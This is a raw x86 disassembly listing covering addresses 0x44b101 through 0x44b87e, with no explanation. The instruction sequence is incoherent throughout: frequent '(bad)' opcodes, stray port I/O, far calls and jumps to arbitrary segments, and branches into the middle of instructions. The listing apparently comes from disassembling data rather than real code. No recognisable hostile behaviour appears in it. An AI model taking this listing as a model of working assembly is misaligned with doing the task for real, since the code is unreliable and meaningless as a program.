  44b101:	dec    eax
  44b102:	adc    al,0x5b
  44b104:	cld    
  44b105:	and    BYTE PTR [edx+0x53],0xfe
  44b109:	out    dx,eax
  44b10a:	les    esp,FWORD PTR [edi]
  44b10c:	xchg   BYTE PTR [ecx-0x34],dl
  44b10f:	cld    
  44b110:	inc    eax
  44b111:	fsub   DWORD PTR [eax+0x28]
  44b114:	xchg   esp,eax
  44b115:	shl    edi,0xd4
  44b118:	imul   esi,DWORD PTR [esi],0x2aa4dae2
  44b11e:	(bad)  
  44b11f:	mov    esi,0x7c571d88
  44b124:	jns    0x44b143
  44b126:	jnp    0x44b153
  44b128:	jae    0x44b12c
  44b12a:	test   BYTE PTR [ebp+0x508015bf],al
  44b130:	fild   WORD PTR [ebx]
  44b132:	push   ds
  44b133:	push   ebx
  44b134:	add    eax,0xff9b205c
  44b139:	jne    0x44b14a
  44b13b:	shr    dl,0x59
  44b13e:	js     0x44b112
  44b140:	dec    ebp
  44b141:	add    ebp,DWORD PTR [eax+0x71]
  44b144:	imul   eax,DWORD PTR [edi-0x1e77e88d],0xffffffe2
  44b14b:	and    BYTE PTR [eax+0x4a71ec0d],bl
  44b151:	add    edx,DWORD PTR [eax-0x1f5f2983]
  44b157:	sbb    ah,BYTE PTR [edx+edi*4+0x60]
  44b15b:	or     ecx,0x63
  44b15e:	xor    eax,0x3652923c
  44b163:	aam    0x42
  44b165:	fimul  DWORD PTR [edx+0x45]
  44b168:	dec    esi
  44b169:	out    dx,eax
  44b16a:	ja     0x44b1af
  44b16c:	fs inc esi
  44b16e:	add    dh,dh
  44b170:	lea    ecx,[edi+0x73]
  44b173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b174:	(bad)  
  44b175:	xlat   BYTE PTR ds:[ebx]
  44b176:	in     al,0x13
  44b178:	push   edi
  44b179:	add    edx,DWORD PTR [esi-0x64e05fdd]
  44b17f:	les    esp,FWORD PTR [edx]
  44b181:	add    DWORD PTR [esi],ebx
  44b183:	fild   WORD PTR [esi+0x69557009]
  44b189:	sbb    al,0xf8
  44b18b:	pop    ebp
  44b18c:	xor    al,0xbe
  44b18e:	gs out 0xd5,eax
  44b191:	mov    gs,ecx
  44b193:	ret    0xc318
  44b196:	ja     0x44b216
  44b198:	mov    WORD PTR [ebp+0x51],ss
  44b19b:	ds mov eax,0x54146f4d
  44b1a1:	dec    ecx
  44b1a2:	loope  0x44b178
  44b1a4:	lock push 0x46a3af5c
  44b1aa:	imul   eax,DWORD PTR [eax+0x681a0f8f],0xffffff9b
  44b1b1:	daa    
  44b1b2:	ret    
  44b1b3:	aam    0x98
  44b1b5:	jecxz  0x44b232
  44b1b7:	scas   eax,DWORD PTR es:[edi]
  44b1b8:	out    0x21,al
  44b1ba:	pop    ecx
  44b1bb:	loope  0x44b176
  44b1bd:	add    ch,BYTE PTR [eax]
  44b1bf:	sbb    edx,DWORD PTR [edi+0x7c9da0ef]
  44b1c5:	or     eax,0xb31ba360
  44b1ca:	cmp    dh,BYTE PTR [ecx-0x2a1ff9fa]
  44b1d0:	and    edi,ebx
  44b1d2:	mov    edi,0x777c55a7
  44b1d7:	ror    BYTE PTR [ecx-0x5c0317c5],cl
  44b1dd:	pushf  
  44b1de:	dec    esi
  44b1df:	jp     0x44b18e
  44b1e1:	add    dh,BYTE PTR [eax-0x4ae56349]
  44b1e7:	cmp    DWORD PTR [ebx],ebp
  44b1e9:	pop    ebp
  44b1ea:	into   
  44b1eb:	or     eax,0x30780296
  44b1f0:	pop    ebx
  44b1f1:	call   0xd70b:0xb548b68
  44b1f8:	cld    
  44b1f9:	cld    
  44b1fa:	xchg   ebp,eax
  44b1fb:	push   ebp
  44b1fc:	mov    ebp,0x88669ae5
  44b201:	sar    DWORD PTR [eax+0x14449495],1
  44b207:	jp     0x44b1e8
  44b209:	adc    al,0xa0
  44b20b:	inc    ebp
  44b20c:	mov    ds:0x44979898,eax
  44b211:	mov    eax,0x26c134e
  44b216:	pop    ds
  44b217:	scas   eax,DWORD PTR es:[edi]
  44b218:	adc    DWORD PTR [ebx],0xe1e109cd
  44b21e:	push   ecx
  44b21f:	inc    ebx
  44b220:	xor    al,0x39
  44b222:	pop    ds
  44b223:	jbe    0x44b1e4
  44b225:	bound  ebp,QWORD PTR [edx]
  44b227:	sub    al,0xf7
  44b229:	and    al,0x1f
  44b22b:	loope  0x44b1f3
  44b22d:	mov    ds:0x460bffba,al
  44b232:	addr16 int3 
  44b234:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b235:	add    dh,dl
  44b237:	pusha  
  44b238:	inc    ebp
  44b239:	ins    DWORD PTR es:[edi],dx
  44b23a:	mov    es,WORD PTR fs:[edi-0x7ad63e9b]
  44b241:	fidivr DWORD PTR [edx-0x37]
  44b244:	mov    DWORD PTR [ecx],esi
  44b246:	or     al,0x2e
  44b248:	cld    
  44b249:	xlat   BYTE PTR ds:[ebx]
  44b24a:	cmp    esp,DWORD PTR [edi+edx*2]
  44b24d:	loopne 0x44b1f2
  44b24f:	ret    
  44b250:	adc    al,0x3
  44b252:	push   ds
  44b253:	push   es
  44b254:	leave  
  44b255:	js     0x44b204
  44b257:	fprem1 
  44b259:	cmp    edi,DWORD PTR [edx+0x3f]
  44b25c:	data16 mov ds:0x6b35b85,al
  44b262:	pusha  
  44b263:	stos   BYTE PTR es:[edi],al
  44b264:	aas    
  44b265:	retf   
  44b266:	fs dec ebx
  44b268:	das    
  44b269:	cmp    eax,0x5a17cbe
  44b26e:	fisubr DWORD PTR [eax]
  44b270:	pop    eax
  44b271:	dec    ebx
  44b272:	not    DWORD PTR [ebx+0x3861d3b1]
  44b278:	mov    DWORD PTR [edi],esi
  44b27a:	and    eax,0xd1a2e00
  44b27f:	xlat   BYTE PTR ds:[ebx]
  44b280:	mov    bl,0x3a
  44b282:	mov    DWORD PTR [eax+0x21f40522],eax
  44b288:	jno    0x44b2e0
  44b28a:	pop    ds
  44b28b:	popf   
  44b28c:	fsubr  DWORD PTR [edx-0x34cbbd85]
  44b292:	inc    ebx
  44b293:	shr    BYTE PTR [ecx+0x64ad2c34],1
  44b299:	pusha  
  44b29a:	dec    DWORD PTR [eax]
  44b29c:	mov    BYTE PTR [ecx+0x41],bl
  44b29f:	inc    esi
  44b2a0:	js     0x44b259
  44b2a2:	mov    ebx,0xcc024891
  44b2a7:	test   eax,0x94825ffd
  44b2ac:	fidivr DWORD PTR [ebp+0x1e]
  44b2af:	repz xor eax,0x90e5b62c
  44b2b5:	std    
  44b2b6:	stos   BYTE PTR es:[edi],al
  44b2b7:	aam    0x1f
  44b2b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b2ba:	sbb    BYTE PTR [ebp+0x2b],ah
  44b2bd:	inc    ebx
  44b2be:	enter  0x693c,0x13
  44b2c2:	push   ds
  44b2c3:	jnp    0x44b2c2
  44b2c5:	xor    dh,ch
  44b2c7:	aas    
  44b2c8:	mov    dh,0x4e
  44b2ca:	jbe    0x44b299
  44b2cc:	push   eax
  44b2cd:	push   es
  44b2ce:	test   ah,dl
  44b2d0:	test   BYTE PTR [bx+si],cl
  44b2d3:	icebp  
  44b2d4:	retf   
  44b2d5:	push   ecx
  44b2d6:	call   0xead43c8f
  44b2db:	test   eax,0xb7d5bec5
  44b2e0:	cs inc edx
  44b2e2:	loope  0x44b270
  44b2e4:	loop   0x44b2f3
  44b2e6:	jecxz  0x44b2be
  44b2e8:	lds    ebx,FWORD PTR [edi-0x3]
  44b2eb:	pop    eax
  44b2ec:	(bad)  
  44b2ed:	adc    eax,0x9aa9d524
  44b2f2:	inc    edx
  44b2f3:	mov    ds:0x7db64d88,eax
  44b2f8:	ret    
  44b2f9:	push   ebp
  44b2fa:	lea    edi,ds:0x179e020a
  44b300:	push   0xffffffa9
  44b302:	sbb    al,0x13
  44b304:	sub    BYTE PTR [esi+0x1f],0xdf
  44b308:	pop    esi
  44b309:	out    dx,eax
  44b30a:	pop    ss
  44b30b:	je     0x44b34f
  44b30d:	ds daa 
  44b30f:	xlat   BYTE PTR ds:[ebx]
  44b310:	jno    0x44b349
  44b312:	js     0x44b31a
  44b314:	inc    esp
  44b315:	jge    0x44b2a6
  44b317:	and    al,0xb8
  44b319:	das    
  44b31a:	in     al,0xe6
  44b31c:	jns    0x44b376
  44b31e:	sub    al,0x5f
  44b320:	ins    DWORD PTR es:[edi],dx
  44b321:	xchg   ecx,eax
  44b322:	pusha  
  44b323:	sbb    ebp,DWORD PTR [ebp+0x7e]
  44b326:	or     DWORD PTR [esi+0x676d9619],ebp
  44b32c:	xor    edi,DWORD PTR [eax-0xb]
  44b32f:	lahf   
  44b330:	aaa    
  44b331:	sub    DWORD PTR [eax-0x45],0xffffffde
  44b335:	mov    ah,0xed
  44b337:	rcr    ecx,cl
  44b339:	pop    es
  44b33a:	and    al,0xaa
  44b33c:	cmp    DWORD PTR [edi+ebx*2+0x608ba7da],ecx
  44b343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b344:	adc    al,0x4b
  44b346:	pusha  
  44b347:	cmp    esp,esi
  44b349:	sti    
  44b34a:	mov    esp,0xd6effbd5
  44b34f:	sub    esp,DWORD PTR ds:0x8911987b
  44b355:	inc    ebp
  44b356:	lods   al,BYTE PTR ds:[esi]
  44b357:	fs xchg esp,eax
  44b359:	xchg   DWORD PTR [eax],esp
  44b35b:	mov    esi,ebx
  44b35d:	add    eax,0xf01bd52e
  44b362:	jecxz  0x44b3a5
  44b364:	mov    bh,0x3e
  44b366:	push   ds
  44b367:	ja     0x44b3dd
  44b369:	or     al,0xa3
  44b36b:	push   cs
  44b36c:	shl    DWORD PTR [ebx-0x59],cl
  44b36f:	fistp  QWORD PTR [eax]
  44b371:	add    eax,ebx
  44b373:	fbstp  TBYTE PTR [ecx-0x10]
  44b376:	jno    0x44b33d
  44b378:	cmp    BYTE PTR [edx-0x15ed9d21],al
  44b37e:	pusha  
  44b37f:	dec    edi
  44b380:	(bad)  
  44b381:	lods   al,BYTE PTR ds:[esi]
  44b382:	fsubr  st(6),st
  44b384:	popa   
  44b385:	and    BYTE PTR [edi+0x1c],0x8d
  44b389:	xchg   ebp,eax
  44b38a:	pusha  
  44b38b:	mov    cl,0xd3
  44b38d:	mov    ebp,DWORD PTR [esi+0x5d40af0e]
  44b393:	sub    esi,DWORD PTR [ecx]
  44b395:	loop   0x44b377
  44b397:	in     al,0x1f
  44b399:	in     al,dx
  44b39a:	sbb    bl,dl
  44b39c:	cmp    BYTE PTR [ebx],al
  44b39e:	rcr    dl,0x3b
  44b3a1:	pop    eax
  44b3a2:	adc    esi,DWORD PTR [esi+0x6b9cd6a6]
  44b3a8:	mov    eax,ds:0x7cec9702
  44b3ad:	mov    eax,ds:0x29d7afd3
  44b3b2:	call   0x5aa5:0xe0a359db
  44b3b9:	ins    DWORD PTR es:[edi],dx
  44b3ba:	in     eax,dx
  44b3bb:	xchg   ebx,eax
  44b3bc:	mov    DWORD PTR [ecx+0x4cfe3515],ebp
  44b3c2:	iret   
  44b3c3:	daa    
  44b3c4:	outs   dx,BYTE PTR ds:[esi]
  44b3c5:	jecxz  0x44b398
  44b3c7:	aad    0xf1
  44b3c9:	in     al,dx
  44b3ca:	add    DWORD PTR ds:0x7367e460,eax
  44b3d0:	xchg   BYTE PTR [ebx-0x2d],ch
  44b3d3:	sbb    BYTE PTR [eax],dl
  44b3d5:	rol    eax,0xcd
  44b3d8:	test   BYTE PTR [edi-0x446d2876],ah
  44b3de:	imul   BYTE PTR [edx+0x74]
  44b3e1:	mov    cl,0x71
  44b3e3:	jmp    0x44b45e
  44b3e5:	jmp    0x44b382
  44b3e7:	out    0x89,eax
  44b3e9:	aas    
  44b3ea:	call   0x725f:0xdf39673e
  44b3f1:	add    DWORD PTR [eax],edi
  44b3f3:	sti    
  44b3f4:	push   0x53d243a2
  44b3f9:	xchg   edx,eax
  44b3fa:	or     BYTE PTR [edi-0x28e0e683],al
  44b400:	mov    ah,0xd2
  44b402:	sahf   
  44b403:	dec    ecx
  44b404:	data16 fidivr DWORD PTR [esi-0x5d]
  44b408:	ror    BYTE PTR ds:0x4f88ea6b,0x29
  44b40f:	stos   DWORD PTR es:[edi],eax
  44b410:	dec    esi
  44b411:	mov    edi,0x3208671f
  44b416:	jnp    0x44b409
  44b418:	jp     0x44b472
  44b41a:	xchg   edi,eax
  44b41b:	(bad)  
  44b41c:	shl    DWORD PTR [ecx+0x5e],0xf5
  44b420:	fsub   DWORD PTR [edi+edi*8]
  44b423:	int    0xf7
  44b425:	sub    ebx,DWORD PTR [edi]
  44b427:	and    ebx,DWORD PTR [ebx-0x657f3fdb]
  44b42d:	mov    cl,bl
  44b42f:	sar    bl,1
  44b431:	dec    esi
  44b432:	loopne 0x44b447
  44b434:	int3   
  44b435:	aaa    
  44b436:	lahf   
  44b437:	or     eax,eax
  44b439:	or     BYTE PTR [esi+0x3f],dh
  44b43c:	repnz cmp eax,0x9b89d71b
  44b442:	std    
  44b443:	dec    esp
  44b444:	in     al,dx
  44b445:	adc    BYTE PTR [edx],bh
  44b447:	sub    al,0x3c
  44b449:	sub    ch,cl
  44b44b:	stos   DWORD PTR es:[edi],eax
  44b44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b44d:	dec    esp
  44b44e:	fist   WORD PTR [eax-0x2bb5f890]
  44b454:	repz scas al,BYTE PTR es:[edi]
  44b456:	cld    
  44b457:	outs   dx,DWORD PTR ds:[esi]
  44b458:	(bad)  
  44b459:	fidivr WORD PTR [edx-0x3d]
  44b45c:	(bad)
  44b460:	push   ds
  44b461:	ret    0x34b4
  44b464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b465:	dec    edi
  44b466:	xor    DWORD PTR [ebx+edi*4-0x6452dfe],0x1450e24b
  44b471:	loope  0x44b492
  44b473:	mov    ebp,DWORD PTR [edi]
  44b475:	mov    edx,0xe56cd8a5
  44b47a:	or     bl,BYTE PTR [esi-0x45a19d86]
  44b480:	dec    eax
  44b481:	aas    
  44b482:	sbb    BYTE PTR [esi+edi*2+0x0],dl
  44b486:	jno    0x44b4dc
  44b488:	or     edx,ebp
  44b48a:	jge    0x44b467
  44b48c:	push   ecx
  44b48d:	dec    ebp
  44b48e:	aam    0xe3
  44b490:	jecxz  0x44b4b1
  44b492:	data16 ins BYTE PTR es:[edi],dx
  44b494:	and    ah,BYTE PTR [edx+0x29]
  44b497:	jno    0x44b4f6
  44b499:	sbb    al,0x8e
  44b49b:	rcr    BYTE PTR [edx],0x85
  44b49e:	mov    esp,0xdc010e3b
  44b4a3:	hlt    
  44b4a4:	les    edi,FWORD PTR [eax]
  44b4a6:	sub    ecx,DWORD PTR [edi+0x5d6c5389]
  44b4ac:	mov    eax,0x7ee10183
  44b4b1:	add    ch,BYTE PTR [esi+esi*4+0x7d3ac037]
  44b4b8:	repz (bad) 
  44b4ba:	pusha  
  44b4bb:	adc    eax,DWORD PTR [ebx-0x769a4c6]
  44b4c1:	mov    WORD PTR [esi-0x29],ds
  44b4c4:	and    al,0xb1
  44b4c6:	pop    eax
  44b4c7:	in     eax,dx
  44b4c8:	or     BYTE PTR [ebp+0x23],ch
  44b4cb:	aaa    
  44b4cc:	clc    
  44b4cd:	push   edi
  44b4ce:	ins    BYTE PTR es:[edi],dx
  44b4cf:	das    
  44b4d0:	in     al,dx
  44b4d1:	xchg   esi,eax
  44b4d2:	push   ebp
  44b4d3:	and    ebx,edi
  44b4d5:	add    eax,0x52ace5c8
  44b4da:	(bad)  
  44b4db:	aad    0x10
  44b4dd:	adc    al,0x74
  44b4df:	or     ebx,DWORD PTR [eax-0x7722a7c4]
  44b4e5:	dec    ebx
  44b4e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44b4e7:	out    dx,eax
  44b4e8:	and    ebp,DWORD PTR [eax+0x31a24b3]
  44b4ee:	sbb    dh,cl
  44b4f0:	sti    
  44b4f1:	pop    ss
  44b4f2:	or     eax,0x1f672928
  44b4f7:	stc    
  44b4f8:	push   ecx
  44b4f9:	ja     0x44b541
  44b4fb:	sbb    BYTE PTR [edi+0x35db4e42],0x2
  44b502:	mov    esi,0xca71cee3
  44b507:	js     0x44b56d
  44b509:	fistp  WORD PTR [edi]
  44b50b:	sbb    eax,0xc226733e
  44b510:	in     eax,0x4e
  44b512:	enter  0x1645,0x3e
  44b516:	push   ds
  44b517:	fbld   TBYTE PTR [ecx+0x65555b51]
  44b51d:	sbb    DWORD PTR [ecx+ecx*8+0x4e],esp
  44b521:	ss mov ch,0x6e
  44b524:	mov    ds:0x92c69f18,al
  44b529:	pop    ss
  44b52a:	adc    al,0xd7
  44b52c:	aam    0x44
  44b52e:	idiv   BYTE PTR [esi]
  44b530:	std    
  44b531:	mov    gs,WORD PTR [edi-0x52]
  44b534:	mov    ecx,DWORD PTR ds:0xca47815f
  44b53a:	out    dx,eax
  44b53b:	clc    
  44b53c:	pop    ecx
  44b53d:	and    DWORD PTR [ecx+0x5d],0xa
  44b541:	dec    esi
  44b542:	inc    edx
  44b543:	mov    edx,0xa20205ad
  44b548:	add    eax,0x88ee5aa8
  44b54d:	test   DWORD PTR [edx+0x5e5f0ea6],ebx
  44b553:	fisubr WORD PTR [edi+0x60dadc02]
  44b559:	mov    dh,0x71
  44b55b:	inc    edx
  44b55c:	outs   dx,DWORD PTR ds:[esi]
  44b55d:	dec    ebx
  44b55e:	push   ds
  44b55f:	popa   
  44b560:	dec    esp
  44b561:	mov    al,ds:0x1608fec7
  44b566:	mov    eax,0xe2b58fd5
  44b56b:	fwait
  44b56c:	xor    al,0xf
  44b56e:	lahf   
  44b56f:	ror    BYTE PTR [ecx+0x6d258da7],1
  44b575:	jp     0x44b50a
  44b577:	imul   edx,DWORD PTR [esi+0x4],0xb649d455
  44b57e:	jp     0x44b5aa
  44b580:	(bad)  
  44b581:	jmp    0xe1bb8889
  44b586:	iret   
  44b587:	adc    DWORD PTR [esi-0x6d],ecx
  44b58a:	loopne 0x44b5d0
  44b58c:	leave  
  44b58d:	cwde   
  44b58e:	pusha  
  44b58f:	fild   DWORD PTR [edx+0xcbba71a]
  44b595:	shl    DWORD PTR [esi+0x172104ac],cl
  44b59b:	nop
  44b59c:	imul   eax,DWORD PTR [edx+0x67b3d8bc],0x1f
  44b5a3:	push   ebx
  44b5a4:	add    DWORD PTR [ebx-0x1f],ebp
  44b5a7:	add    BYTE PTR [ebp+0x27],bh
  44b5aa:	mov    al,0x40
  44b5ac:	retf   
  44b5ad:	jns    0x44b5cd
  44b5af:	cs jp  0x44b62b
  44b5b2:	sbb    ah,BYTE PTR [ebp-0x1f]
  44b5b5:	lahf   
  44b5b6:	pop    ds
  44b5b7:	shl    DWORD PTR [eax-0x79],1
  44b5ba:	mov    eax,0x64306dc
  44b5bf:	aam    0x90
  44b5c1:	shl    BYTE PTR [esi],0x71
  44b5c4:	or     al,BYTE PTR [eax]
  44b5c6:	sbb    DWORD PTR [esi-0x78],ecx
  44b5c9:	jnp    0x44b5c1
  44b5cb:	and    al,0x99
  44b5cd:	adc    BYTE PTR [esi+0x1f],cl
  44b5d0:	dec    eax
  44b5d1:	push   ds
  44b5d2:	jp     0x44b642
  44b5d4:	in     al,dx
  44b5d5:	sbb    edx,eax
  44b5d7:	arpl   WORD PTR [eax+0x4],cx
  44b5da:	mov    ds:0xd6938990,eax
  44b5df:	cmp    eax,0x1e60009c
  44b5e4:	ret    0xe41c
  44b5e7:	in     eax,0xa5
  44b5e9:	mov    esi,0x50c9f483
  44b5ee:	and    al,0x1a
  44b5f0:	mov    ah,0xad
  44b5f2:	mul    BYTE PTR [esi]
  44b5f4:	or     BYTE PTR [edx],bl
  44b5f6:	les    esi,FWORD PTR [eax+edx*8]
  44b5f9:	pop    edi
  44b5fa:	popf   
  44b5fb:	fld    QWORD PTR [edx+0x15]
  44b5fe:	adc    cl,cl
  44b600:	or     DWORD PTR [edi+edi*2],esp
  44b603:	mov    ch,0xbe
  44b605:	pushf  
  44b606:	in     al,dx
  44b607:	jmp    0x694d:0x95072188
  44b60e:	imul   DWORD PTR [ebx-0xdbbfd24]
  44b614:	lock ja 0x44b5f8
  44b617:	fistp  DWORD PTR [esi+0x63d91f31]
  44b61d:	jp     0x44b5c4
  44b61f:	retf   0x2742
  44b622:	aad    0xd5
  44b624:	enter  0x5392,0xe7
  44b628:	bound  esi,QWORD PTR [edi]
  44b62a:	clc    
  44b62b:	mov    esi,DWORD PTR [ebx+0x16]
  44b62e:	pop    ds
  44b62f:	popa   
  44b630:	lea    ecx,[edi-0x3a]
  44b633:	inc    eax
  44b634:	pop    esp
  44b635:	addr16 into 
  44b637:	aam    0xdb
  44b639:	sub    eax,0x58ebb810
  44b63e:	dec    edx
  44b63f:	mov    bh,0x49
  44b641:	fwait
  44b642:	pusha  
  44b643:	mov    ds:0x6cc8b88a,eax
  44b648:	loopne 0x44b64b
  44b64a:	push   esp
  44b64b:	aam    0xd4
  44b64d:	idiv   DWORD PTR [esi]
  44b64f:	ja     0x44b626
  44b651:	lods   al,BYTE PTR ds:[esi]
  44b652:	(bad)  
  44b653:	pop    esi
  44b654:	xchg   BYTE PTR [ebp-0x512eb9eb],ch
  44b65a:	mov    al,ds:0xf24d4293
  44b65f:	aad    0x28
  44b661:	mov    ds:0x6d00030e,al
  44b666:	xchg   BYTE PTR [ecx+0x6d608e68],dl
  44b66c:	jg     0x44b6af
  44b66e:	test   DWORD PTR [esi],edx
  44b670:	adc    BYTE PTR [esi],0x8d
  44b673:	aad    0xc9
  44b675:	dec    ebp
  44b676:	inc    eax
  44b677:	ins    DWORD PTR es:[edi],dx
  44b678:	clc    
  44b679:	mov    bh,BYTE PTR [edx+esi*4-0x6fd79277]
  44b680:	xchg   esp,eax
  44b681:	(bad)  
  44b682:	popf   
  44b683:	inc    ebx
  44b684:	mov    eax,0xf9512802
  44b689:	aad    0xb9
  44b68b:	add    ch,ch
  44b68d:	lahf   
  44b68e:	popa   
  44b68f:	xor    DWORD PTR [eax-0x79a8d0bb],esi
  44b695:	lods   eax,DWORD PTR ds:[esi]
  44b696:	mov    al,ds:0x24037cfb
  44b69b:	sub    bh,ch
  44b69d:	cmp    DWORD PTR [edi+0x67f44955],ecx
  44b6a3:	fwait
  44b6a4:	push   esi
  44b6a5:	sbb    edi,esi
  44b6a7:	mov    edi,0x601e9888
  44b6ac:	popf   
  44b6ad:	add    al,ah
  44b6af:	repz aas 
  44b6b1:	pop    ds
  44b6b2:	enter  0x9adc,0x7c
  44b6b6:	push   ds
  44b6b7:	mov    bl,0x35
  44b6b9:	in     eax,0xfb
  44b6bb:	int3   
  44b6bc:	jp     0x44b69a
  44b6be:	iret   
  44b6bf:	adc    al,0xe0
  44b6c1:	add    eax,0xc82413da
  44b6c6:	xchg   edx,eax
  44b6c7:	in     al,0xa9
  44b6c9:	sub    DWORD PTR [edx-0x1b],0x5440e747
  44b6d0:	or     BYTE PTR [ebp-0x7f],al
  44b6d3:	jp     0x44b725
  44b6d5:	add    ecx,esi
  44b6d7:	mov    ebx,0x15baf3f5
  44b6dc:	imul   ecx,edi,0x2654d9a
  44b6e2:	fldcw  WORD PTR [ecx+0x39]
  44b6e5:	xchg   edi,eax
  44b6e6:	retf   0x41ec
  44b6e9:	addr16 sub al,0xd9
  44b6ec:	cli    
  44b6ed:	add    eax,0xb614469e
  44b6f2:	cmp    DWORD PTR [esi+ecx*4+0x18fd74b1],esp
  44b6f9:	or     al,0x55
  44b6fb:	cmp    ecx,DWORD PTR [esi]
  44b6fd:	inc    esp
  44b6fe:	and    ah,BYTE PTR [ecx+ebp*2+0x28]
  44b702:	fsubr  QWORD PTR [eax+esi*2+0x8]
  44b706:	pop    ecx
  44b707:	aad    0xee
  44b709:	cdq    
  44b70a:	mov    al,ds:0x3f931ad
  44b70f:	push   es
  44b710:	mov    DWORD PTR [ecx],ebp
  44b712:	push   esp
  44b713:	push   cs
  44b714:	xor    al,0x2f
  44b716:	adc    al,0xc7
  44b718:	add    bl,BYTE PTR [eax+ecx*2]
  44b71b:	repz push DWORD PTR [edx+0x11591c12]
  44b722:	adc    eax,0x1c3788fc
  44b727:	sbb    dl,ch
  44b729:	cmp    ebp,DWORD PTR [edi+0x44]
  44b72c:	stos   BYTE PTR es:[edi],al
  44b72d:	add    al,BYTE PTR [eax-0x31834a6]
  44b733:	les    eax,FWORD PTR [edi]
  44b735:	jmp    0x7235:0x8eb92760
  44b73c:	hlt    
  44b73d:	(bad)  
  44b73e:	in     al,dx
  44b73f:	lahf   
  44b740:	inc    esp
  44b741:	mov    bh,cl
  44b743:	push   ebp
  44b744:	xor    ebx,DWORD PTR [eax-0x1ec6af0e]
  44b74a:	pop    ds
  44b74b:	adc    eax,DWORD PTR [eax]
  44b74d:	inc    edx
  44b74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b74f:	sub    dh,BYTE PTR [eax+0x44]
  44b752:	mov    ch,dl
  44b754:	inc    ebx
  44b755:	jl     0x44b739
  44b757:	ins    BYTE PTR es:[edi],dx
  44b758:	(bad)  
  44b759:	cmp    eax,0x51b713a4
  44b75e:	push   edi
  44b75f:	sbb    BYTE PTR [eax+0x24511355],cl
  44b765:	push   DWORD PTR [edx+0x3fe6b5d4]
  44b76b:	dec    edi
  44b76c:	add    edx,DWORD PTR [edi+ebx*1-0x5654770c]
  44b773:	adc    ebp,eax
  44b775:	mov    cl,0xff
  44b777:	xchg   ebp,eax
  44b778:	clc    
  44b779:	inc    edi
  44b77a:	mov    esp,0xd9020ff8
  44b77f:	(bad)  
  44b780:	sbb    DWORD PTR [ebx+0x10],esp
  44b783:	cld    
  44b784:	mov    BYTE PTR [ebp-0x72],cl
  44b787:	fs mov gs,esi
  44b78a:	aaa    
  44b78b:	ret    
  44b78c:	test   BYTE PTR ds:0x454feb62,0x7c
  44b793:	xchg   esp,eax
  44b794:	repz test BYTE PTR [eax-0x71],ah
  44b798:	retf   0x2ab0
  44b79b:	arpl   WORD PTR [eax-0x5e2b2a64],bx
  44b7a1:	push   eax
  44b7a2:	pop    edx
  44b7a3:	pop    ss
  44b7a4:	(bad)  
  44b7a5:	stos   BYTE PTR es:[edi],al
  44b7a6:	adc    dh,BYTE PTR [ecx-0x79]
  44b7a9:	jmp    0x44b7be
  44b7ab:	push   ebx
  44b7ac:	sub    al,0xd2
  44b7ae:	xor    BYTE PTR [edi-0x2a7b1540],0x1d
  44b7b5:	push   0x93b54569
  44b7ba:	test   eax,0x4351b6b5
  44b7bf:	cli    
  44b7c0:	xchg   BYTE PTR [ecx+0x45],dh
  44b7c3:	mov    ah,0x89
  44b7c5:	adc    BYTE PTR [edx],dl
  44b7c7:	add    al,ch
  44b7c9:	add    eax,0xf2e667da
  44b7ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b7cf:	sbb    eax,0xfb92334d
  44b7d4:	pop    ebp
  44b7d5:	add    ebx,ebx
  44b7d7:	xchg   esi,eax
  44b7d8:	or     al,BYTE PTR [edi+0x39]
  44b7db:	mov    eax,0x86fa0209
  44b7e0:	hlt    
  44b7e1:	mov    esi,0xc06b7b81
  44b7e6:	pop    ds
  44b7e7:	pop    ecx
  44b7e8:	adc    bh,BYTE PTR [ebx]
  44b7ea:	jns    0x44b7d9
  44b7ec:	or     bh,0xde
  44b7ef:	aad    0xe1
  44b7f1:	sub    al,0x61
  44b7f3:	scas   eax,DWORD PTR es:[edi]
  44b7f4:	xor    cl,BYTE PTR [edi+ecx*8+0x4a918ac8]
  44b7fb:	(bad)  
  44b7fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44b7fd:	cld    
  44b7fe:	mov    dl,0x60
  44b800:	xor    BYTE PTR [edi-0x3a],dh
  44b803:	pushf  
  44b804:	in     eax,dx
  44b805:	mov    edi,0x16133963
  44b80a:	pop    edi
  44b80b:	int    0xff
  44b80d:	add    BYTE PTR [edi],dl
  44b80f:	dec    BYTE PTR [esi+0x4ea7ce95]
  44b815:	icebp  
  44b816:	and    DWORD PTR [edx+eiz*2],0x53
  44b81a:	xor    edi,edx
  44b81c:	popa   
  44b81d:	and    eax,0x6a6cbab0
  44b822:	ja     0x44b7fd
  44b824:	mov    BYTE PTR [ebx+0x5ca260ea],dh
  44b82a:	int3   
  44b82b:	pop    ds
  44b82c:	mov    es,WORD PTR [edx]
  44b82e:	ss inc eax
  44b830:	aad    0xa1
  44b832:	dec    ebx
  44b833:	pop    ebp
  44b834:	xor    BYTE PTR [edx],0x1f
  44b837:	sbb    edx,DWORD PTR [eax]
  44b839:	sti    
  44b83a:	cmc    
  44b83b:	inc    ebp
  44b83c:	push   esi
  44b83d:	jl     0x44b7e2
  44b83f:	aam    0x34
  44b841:	scas   eax,DWORD PTR es:[edi]
  44b842:	jle    0x44b829
  44b844:	leave  
  44b845:	sbb    edi,edi
  44b847:	inc    esi
  44b848:	mov    ebx,esp
  44b84a:	xor    edx,DWORD PTR [ebp-0x7647da2a]
  44b850:	add    DWORD PTR [esi],esi
  44b852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b853:	aam    0x57
  44b855:	add    bh,BYTE PTR [esp+esi*2+0x52]
  44b859:	retf   
  44b85a:	jmp    0x384464c0
  44b85f:	(bad)  
  44b861:	inc    eax
  44b862:	pop    ds
  44b863:	and    esp,edi
  44b865:	dec    ebx
  44b866:	adc    al,0xf1
  44b868:	sub    ch,cl
  44b86a:	pusha  
  44b86b:	icebp  
  44b86c:	add    ebx,DWORD PTR ds:0x5d72ef50
  44b872:	test   eax,0x8d00649e
  44b877:	(bad)  
  44b878:	mov    DWORD PTR [edx-0x4b466fa6],edi
  44b87e:	jmp    0x6c9e40be
